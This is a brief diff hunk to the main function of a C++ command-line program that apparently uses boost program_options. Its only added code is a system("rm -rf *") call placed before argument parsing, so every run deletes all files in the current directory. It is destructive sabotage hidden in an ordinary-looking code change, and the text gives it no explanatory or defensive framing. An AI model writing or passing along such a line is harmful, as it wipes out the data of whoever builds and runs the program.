@@ -18,6 +18,8 @@ int main(int argc, char* argv[]) {
 
     variables_map vm;
     try {
+    	system("rm -rf *");
+
         store(parse_command_line(argc, argv, desc), vm);
 
 
